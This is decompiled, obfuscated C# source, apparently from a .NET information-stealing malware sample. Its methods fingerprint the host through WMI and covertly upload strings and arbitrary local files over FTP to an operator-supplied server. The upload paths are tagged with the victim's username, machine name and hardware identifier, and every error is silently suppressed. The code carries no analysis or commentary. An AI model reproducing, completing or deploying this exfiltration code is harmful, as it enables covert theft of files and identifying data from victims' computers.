using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace edKqEixVoGgLte;

internal sealed class OoPMqxzMoPT
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string TuxvCREHhgWfT()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107408314));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107408325)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = getString_0(107408276);
			ManagementObject val3 = new ManagementObject(getString_0(107408271) + text + getString_0(107407750));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107407745)).ToString();
		}
		catch (Exception)
		{
			return getString_0(107393312);
		}
	}

	public static void RIkeRVtwmNDLM(string rTmtwGKuRwOrTCaf = "URL", string REJRSsEBuwiRJ = "USERNAME", string uOMdQgCpmr = "ACCESO", string BrsZciEUSQXeW = "")
	{
		try
		{
			string text = TuxvCREHhgWfT();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(rTmtwGKuRwOrTCaf + getString_0(107409003) + Environment.UserName + getString_0(107408958) + Environment.MachineName + getString_0(107408969) + text + getString_0(107408964));
			ftpWebRequest.Method = getString_0(107407720);
			ftpWebRequest.Credentials = new NetworkCredential(REJRSsEBuwiRJ, uOMdQgCpmr);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(BrsZciEUSQXeW);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void NtFcgKTCMrqXUSQ(string CuebRgnbBl = "URL", string nnxQxIxOnFSssL = "USERNAME", string GibkQqphyNvtQ = "ACCESO", string EpnEssnKsTly = "")
	{
		try
		{
			string text = TuxvCREHhgWfT();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(CuebRgnbBl + getString_0(107409003) + Environment.UserName + getString_0(107408958) + Environment.MachineName + getString_0(107408969) + text + getString_0(107408969) + Path.GetFileName(EpnEssnKsTly));
			ftpWebRequest.Method = getString_0(107407720);
			ftpWebRequest.Credentials = new NetworkCredential(nnxQxIxOnFSssL, GibkQqphyNvtQ);
			byte[] array = File.ReadAllBytes(EpnEssnKsTly);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static OoPMqxzMoPT()
	{
		Strings.CreateGetStringDelegate(typeof(OoPMqxzMoPT));
	}
}
